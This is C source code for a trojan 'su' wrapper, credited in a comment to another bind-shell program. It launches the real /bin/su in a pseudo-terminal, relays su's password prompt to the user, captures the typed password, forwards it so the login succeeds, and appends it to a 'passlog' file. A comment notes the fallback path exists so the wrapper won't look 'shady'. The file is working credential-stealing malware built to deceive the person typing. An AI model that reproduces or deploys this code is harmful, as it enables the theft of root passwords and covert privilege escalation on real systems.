// Cribbed heavily from Scriptjunkie's stdiobindshell.c

#include <signal.h>
#include <errno.h>
#include <termios.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pty.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/select.h>

#define BUF_SIZE 255

extern int forkpty(int *amaster, char *name, const struct termios *termp, const struct winsize *winp);

__sighandler_t old_sigwinch, old_sigint;
struct termios old_term_settings;
int terminalfd;

void cleanup_and_exit(int status)
{
    // reset terminal
    tcsetattr(STDIN_FILENO, TCSANOW, &old_term_settings);
    // Reset signal handlers
    signal(SIGINT, old_sigint);
    signal(SIGWINCH, old_sigwinch);
    exit(status);
}

void handle_int(int sig)
{
    write(terminalfd, &old_term_settings.c_cc[VINTR], 1);
}

void handle_winch(int sig)
{
    struct winsize ws;
    printf("handling winch\n");
    ioctl(STDIN_FILENO, TIOCGWINSZ, &ws);
    ioctl(terminalfd, TIOCSWINSZ, &ws);
}

void funnel(pid_t pid, int in_fd, int out_fd)
{
    int status;
    char buf[BUF_SIZE];
    int numbytes = read(in_fd, buf, BUF_SIZE - 1);

    if (numbytes == -1) // on error, if we're really done, then kill ourselves, otherwise continue
    {
        if(errno == 5)
        {
            waitpid(pid, &status, WNOHANG);
            if (WIFEXITED(status))
            {
                cleanup_and_exit(WEXITSTATUS(status));
            } else {
                cleanup_and_exit(1);
            }
        }
    }
    write(out_fd, buf, numbytes);
    return;
}

int main(int argc, char * const *argv)
{
    struct termios new_term_settings;
    char *command;
    pid_t pid;

    FILE *file = fopen("passlog", "a+");

    char buf[BUF_SIZE];
    char output[BUF_SIZE];

    struct winsize ws;

    old_sigwinch = signal(SIGWINCH, handle_winch);
    old_sigint = signal(SIGINT, handle_int);

    /* Retrieve current terminal settings, turn echoing off */
    if (tcgetattr(STDIN_FILENO, &new_term_settings) == -1)
    {
        perror("tcgetattr");
        cleanup_and_exit(1);
    }

    old_term_settings = new_term_settings;

    /* ECHO off, other bits unchanged */
    new_term_settings.c_lflag &= ~ECHO;

    if (tcsetattr(STDIN_FILENO, TCSAFLUSH, &new_term_settings) == -1)
    {
        perror("tcsetattr");
        cleanup_and_exit(1);
    }

    pid = forkpty(&terminalfd, (char *)NULL, NULL, NULL);
    // Doing the exec in the child and also on error lets us fall back to just
    // exec'ing su if forkpty fails. We won't get the password, but it also
    // won't make it obvious that we're being shady.
    if (pid == 0 || pid == -1)
    {
        cleanup_and_exit(execvp("/bin/su", argv));
    }

    // Get current window size
    ioctl(STDIN_FILENO, TIOCGWINSZ, &ws);

    // Testing on Ubuntu, forkpty seems to ignore the window size, so set it
    // with ioctl, too.
    ioctl(terminalfd, TIOCSWINSZ, &ws);

    // read the password prompt
    int numbytes = read(terminalfd, output, BUF_SIZE - 1);
    // Display it to the user
    write(1, output, numbytes);

    // grab the password from the user
    fgets(buf, BUF_SIZE, stdin);

    // forward it to su, with the newline intact
    write(terminalfd, buf, strlen(buf));
    // And save it
    fprintf(file, "%s\n", buf);

    tcgetattr(STDIN_FILENO, &old_term_settings);
    new_term_settings = old_term_settings;
    new_term_settings.c_lflag &= ~ICANON;
    new_term_settings.c_lflag &= ~ECHO;
    tcsetattr(STDIN_FILENO, TCSANOW, &new_term_settings);

    fd_set rfds;
    FD_ZERO(&rfds);
    while (1)
    {
        int numbytes;

        struct timeval tv;
        int retval;

        FD_SET(STDIN_FILENO, &rfds);
        FD_SET(terminalfd, &rfds);

        tv.tv_sec = 5;
        tv.tv_usec = 0;

        retval = select(FD_SETSIZE, &rfds, NULL, NULL, &tv);

        if (retval == -1 || retval == 0)
        {
            // Then either there was an error (such as ctrl-c interrupting the
            // select()), or the time elapsed without input from either side.
            // Whichever it was, there's nothing to read, so go back to the top
            // of the loop.
            continue;
        }

        if (FD_ISSET(STDIN_FILENO, &rfds))
        {
            funnel(pid, STDIN_FILENO, terminalfd);
        }

        if (FD_ISSET(terminalfd, &rfds))
        {
            funnel(pid, terminalfd, STDIN_FILENO);
        }

    }

    cleanup_and_exit(EXIT_SUCCESS);
}
